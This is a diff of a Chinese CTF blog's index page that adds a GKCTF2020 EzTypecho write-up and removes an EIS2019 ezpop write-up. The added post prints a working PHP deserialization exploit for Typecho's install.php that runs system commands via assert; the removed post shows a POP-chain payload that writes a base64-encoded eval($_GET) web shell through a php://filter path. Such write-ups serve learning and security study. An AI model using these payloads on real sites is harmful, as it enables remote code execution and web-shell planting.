@@ -196,6 +196,150 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[GKCTF2020]EzTypecho.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%5BGKCTF2020%5DEzTypecho.html" class="post-title-link" itemprop="url">GKCTF2020 EzTypecho</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-10 10:20:00" itemprop="dateCreated datePublished" datetime="2020-07-10T10:20:00+08:00">2020-07-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-12 16:33:48" itemprop="dateModified" datetime="2020-07-12T16:33:48+08:00">2020-07-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BGKCTF2020%5DEzTypecho.html" class="post-meta-item leancloud_visitors" data-flag-title="GKCTF2020 EzTypecho" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BGKCTF2020%5DEzTypecho.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BGKCTF2020%5DEzTypecho.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="GKCTF2020-EzTypecho"><a href="#GKCTF2020-EzTypecho" class="headerlink" title="[GKCTF2020]EzTypecho"></a>[GKCTF2020]EzTypecho</h1><p>暑假恢复刷题，顺便把以前堆积的东西也都更新到博客上，清一下桌面<br>GKCTF这次题感觉好多都是现有CVE之类的东西，然后加一点点<br>题目是一个typecho的安装流程，但是安装到一半就不给安装了，想了半天不知道他想让我怎样才能安装，后来才知道是typecho在安装时install.php有一个反序列化的任意代码执行。<br>最后题目还要求反序列化需要一个session，需要自己想办法建立一个session</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>typecho反序列化的pop链网上都有分析了，抄一个脚本执行任意命令<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/vuls/155753.html">https://www.freebuf.com/vuls/155753.html</a></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$CMD</span> <span class="token operator">=</span> <span class="token string">'system("cat /flag")'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string">'RSS 2.0'</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string">'ATOM 1.0'</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//$this->_type = $this::RSS2;</span>
+
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATOM1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+            <span class="token string">'category'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token constant">CMD</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token string">'prefix'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'typecho_'</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/%5BGKCTF2020%5DEzTypecho.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[HFCTF2020]BabyUpload.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -747,241 +891,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[EIS%202019]ezpop.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
-      <meta itemprop="name" content="Z3ratu1">
-      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Z3ratu1's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%5BEIS%202019%5Dezpop.html" class="post-title-link" itemprop="url">EIS2019 ezpop</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-16 20:47:00" itemprop="dateCreated datePublished" datetime="2020-03-16T20:47:00+08:00">2020-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-12 16:33:48" itemprop="dateModified" datetime="2020-07-12T16:33:48+08:00">2020-07-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/%5BEIS%202019%5Dezpop.html" class="post-meta-item leancloud_visitors" data-flag-title="EIS2019 ezpop" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/%5BEIS%202019%5Dezpop.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/%5BEIS%202019%5Dezpop.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="EIS2019-ezpop"><a href="#EIS2019-ezpop" class="headerlink" title="[EIS2019] ezpop"></a>[EIS2019] ezpop</h1><p>看到这个标题就知道应该是反序列化构造pop链，不过实际写下来感觉pop链没什么东西，绕过的trick倒是学了一堆，先上源码</p>
-<pre class=" language-PHP"><code class="language-PHP"><?php
-error_reporting(0);
-
-class A {
-
-    protected $store;
-
-    protected $key;
-
-    protected $expire;
-
-    public function __construct($store, $key = 'flysystem', $expire = null) {
-        $this->key = $key;
-        $this->store = $store;
-        $this->expire = $expire;
-    }
-
-    public function cleanContents(array $contents) {
-        $cachedProperties = array_flip([
-            'path', 'dirname', 'basename', 'extension', 'filename',
-            'size', 'mimetype', 'visibility', 'timestamp', 'type',
-        ]);
-
-        foreach ($contents as $path => $object) {
-            if (is_array($object)) {
-                $contents[$path] = array_intersect_key($object, $cachedProperties);
-            }
-        }
-
-        return $contents;
-    }
-
-    public function getForStorage() {
-        $cleaned = $this->cleanContents($this->cache);
-
-        return json_encode([$cleaned, $this->complete]);
-    }
-
-    public function save() {
-        $contents = $this->getForStorage();
-//        print $contents;
-        $this->store->set($this->key, $contents, $this->expire);
-    }
-
-    public function __destruct() {
-        if (!$this->autosave) {
-            $this->save();
-        }
-    }
-}
-
-class B {
-
-    protected function getExpireTime($expire): int {
-        return (int) $expire;
-    }
-
-    public function getCacheKey(string $name): string {
-        return $this->options['prefix'] . $name;
-    }
-
-    protected function serialize($data): string {
-        if (is_numeric($data)) {
-            return (string) $data;
-        }
-
-        $serialize = $this->options['serialize'];
-
-        return $serialize($data);
-    }
-
-    public function set($name, $value, $expire = null): bool{
-        $this->writeTimes++;
-
-        if (is_null($expire)) {
-            $expire = $this->options['expire'];
-        }
-
-        $expire = $this->getExpireTime($expire);
-        $filename = $this->getCacheKey($name);
-
-        $dir = dirname($filename);
-
-        if (!is_dir($dir)) {
-            try {
-                mkdir($dir, 0755, true);
-            } catch (\Exception $e) {
-                // 创建失败
-            }
-        }
-
-        $data = $this->serialize($value);
-
-        if ($this->options['data_compress'] && function_exists('gzcompress')) {
-            //数据压缩
-            $data = gzcompress($data, 3);
-        }
-
-        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
-//        print $data;
-        $result = file_put_contents($filename, $data);
-
-        if ($result) {
-            return true;
-        }
-
-        return false;
-    }
-
-}
-
-if (isset($_GET['src']))
-{
-    highlight_file(__FILE__);
-}
-
-$dir = "uploads/";
-
-if (!is_dir($dir))
-{
-    mkdir($dir);
-}
-unserialize($_GET["data"]);
-
-$b = new B();
-$b->options['serialize'] = "strval";
-$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=./uploads/";
-$a = new A($b, 'z3ratu1.php');
-$a->cache = array('dirname'=> "PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4");
-echo str_replace(' ','%',serialize($a));
-</code></pre>
-<p>定义两个类，魔法方法就A中一个构造一个析构，能用的只有析构，析构直接进save，save函数仅在B类中存在，也就省去了有的题目还要思考是走哪个类的pop链的问题<br>类A最后会通过析构进入类B的save函数中，所以store这个对象肯定是一个B，类A剩下两个函数都是对content内容进行加工，但是就我做题情况而言，好像这两个函数都没什么用。。。<br>总的效果就是如果数组中存在一个值仍为数组，就把他和写死的数组比较然后返回键名相同的项，最后通过json_encode一下，<br>最后这个值会在save函数里作为data的内容拼接一个exit写入文件，剩下的A，B两个类里面的大部分参数都是直接可以控制的，A中的key为写入的文件名，B中的option[‘prefix’]是目录名<br>options[‘expire’]不知道有什么用，一通类型转换之后写进了注释里面，<code>sprintf(&#39;%012d&#39;, $expire)</code>这里的%012d表示最短12位的数字，不足12位用0填充<br>option[‘serialize’]中对应的函数名对我们传入的数据进行一次处理，什么都不做就可以了，选择strval()<br>options[‘data_compress’]不知道是想干什么，是不是把自己写入的字符串压缩一下到时候可以在写入的时候用伪协议解压写入来绕过死亡exit？<br>但是file_put_contents也支持其他协议，比如php:&#x2F;&#x2F;filter，我们把shell先用base64编码传入，用base64解码将整个内容解码写入就可以绕过死亡exit了，这个是个很老的trick，以前看p神的博客有写过<br>整个题重点就是一个<code>option[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=upload/&#39;</code></p>
-<h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/%5BEIS%202019%5Dezpop.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1052,7 +961,7 @@ echo str_replace(' ','%',serialize($a));
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">186</span>
+          <span class="site-state-item-count">187</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1065,7 +974,7 @@ echo str_replace(' ','%',serialize($a));
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">93</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
